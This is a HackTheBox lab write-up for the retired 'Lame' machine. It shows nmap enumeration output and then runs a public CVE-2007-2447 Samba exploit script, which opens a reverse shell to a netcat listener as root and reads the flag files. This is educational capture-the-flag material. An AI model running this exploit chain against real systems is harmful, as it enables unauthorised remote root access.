---
title: Lame Machine Writeup- HackTheBox
date: 2020-12-2 10:30:00
excerpt: A retired linux box from HackTheBox, owned by exploiting the known vulnerability on the installed Samba 
         version. 
thumbnail: /assets/images/Lame/info.png
categories:
- HTB
- Writeup
tags:
- linux
- samba
- CVE-2007-2447
- without metasploit
---

![Info](/assets/images/Lame/info.png)

# Methodology
1. Open Ports Enumeration
2. Samba version identified
3. RCE for Samba version identified
4. Foothold gained as root user

# Lessons Learned
1. Public Exploit Identification

# Open Ports Enumeration
The open port enumeration through targetRecon[^footnote] had identified four open ports namely **FTP** (21), **SSH** (22),
**NETBIOS-SSN** (139) and **MICROSOFT-DS** (445). The scan had not identified any known vulnerabilities through 
vulnerability scan. The results of the scan are given below.
``` 
b4bygroot@arcolinux:~/HTB/Tracks/Beginner_Track/Lame|
⇒  targetRecon 10.10.10.3
[+] Open Ports Scan
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
		21      ftp
		22      ssh
		139     netbios-ssn
		445     microsoft-ds
[+] Scripts Scan
				 nmap -sV -A --script=default,vuln -p 21 10.10.10.3
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.

Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-02 13:38 IST
Nmap scan report for 10.10.10.3 (10.10.10.3)
Host is up (0.20s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_sslv2-drown: 
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.46 seconds

				 nmap -sV -A --script=default,vuln -p 22 10.10.10.3
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.

Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-02 13:38 IST
Nmap scan report for 10.10.10.3 (10.10.10.3)
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
| vulners: 
|   cpe:/a:openbsd:openssh:4.7p1: 
|       PACKETSTORM:101052      7.8     https://vulners.com/packetstorm/PACKETSTORM:101052      *EXPLOIT*
|       CVE-2010-4478   7.5     https://vulners.com/cve/CVE-2010-4478
|       CVE-2008-1657   6.5     https://vulners.com/cve/CVE-2008-1657
|       SSV:60656       5.0     https://vulners.com/seebug/SSV:60656    *EXPLOIT*
|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906
|       CVE-2010-5107   5.0     https://vulners.com/cve/CVE-2010-5107
|       CVE-2010-4755   4.0     https://vulners.com/cve/CVE-2010-4755
|       CVE-2012-0814   3.5     https://vulners.com/cve/CVE-2012-0814
|       CVE-2011-5000   3.5     https://vulners.com/cve/CVE-2011-5000
|       CVE-2011-4327   2.1     https://vulners.com/cve/CVE-2011-4327
|_      CVE-2008-3259   1.2     https://vulners.com/cve/CVE-2008-3259
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.15 seconds

				 nmap -sV -A --script=default,vuln -p 139 10.10.10.3
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.

Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-02 13:39 IST
Nmap scan report for 10.10.10.3 (10.10.10.3)
Host is up (0.20s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)

Host script results:
|_clock-skew: mean: 2h39m33s, deviation: 3h33m46s, median: 8m23s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2020-12-02T03:20:12-05:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: false
|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 425.45 seconds

				 nmap -sV -A --script=default,vuln -p 445 10.10.10.3
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.

Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-02 13:46 IST
Nmap scan report for 10.10.10.3 (10.10.10.3)
Host is up (0.20s latency).

PORT    STATE SERVICE     VERSION
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)

Host script results:
|_clock-skew: mean: 2h38m28s, deviation: 3h32m14s, median: 8m23s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2020-12-02T03:25:02-05:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: false
|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 172.54 seconds

[+] Summary 
21      ftp     vsftpd 2.3.4
				No vuln found
22      ssh     OpenSSH 4.7p1 Debian 8ubuntu1
				No vuln found
139     netbios-ssn     Samba smbd 3.0.20-Debian
				No vuln found
445     microsoft-ds    Samba smbd 3.0.20-Debian
				No vuln found
```

# Samba Service Enumeration
Through the scan result from the previous section the **Samba** service version of the target was identified as 
***3.0.20***. Google-Fu with the version had identified a known vulnerability through ***CVE-2007-2447***. Though
metasploit module is available for the vulnerability, further googling had identified a working python exploit on GitHub
by **amriunix**[^footnote2]. 

# Foothold
Before executing the exploit, the required package ***pysmb*** needed to be installed through *pip*. 
A *netcat* listener, listening on port **9095** was initiated after which the exploit script was executed as follows.
```shell
[b4bygroot@arcolinux Lame ]$ python usermapScript.py 10.10.10.3 445 10.10.14.3 9095
[*] CVE-2007-2447 - Samba usermap script
[+] Connecting !
[+] Payload was sent - check netcat !
``` 
This resulted in a reverse shell on the netcat listener. Enumerating further had showed that the shell received was from
the **root** user, eliminating the need for privilege escalation. The same is shown on the section below.
```shell
➜  Lame  nc -nvlp 9095                                         
Connection from 10.10.10.3:52271
python -c "import pty;pty.spawn('/bin/bash')"
root@lame:/# id
id
uid=0(root) gid=0(root)
root@lame:/# cat /root/root.txt
cat /root/root.txt
0a4e1bf944cdc7df8c2f1eb56bf8030d
root@lame:/# cat /home/makis/user.txt
cat /home/makis/user.txt
a392eccf53d48a4abf840247bd155f80
root@lame:/# 
```
![Root Shell](/assets/images/Lame/rootShell.png)

# System Own
![System Owned](/assets/images/Lame/machineOwn.png)

# Resources
[^footnote]:[targetRecon](https://github.com/b4bygroot/TargetRecon)
[^footnote2]:[CVE-2007-2447 Samba usermap script](https://github.com/amriunix/CVE-2007-2447)
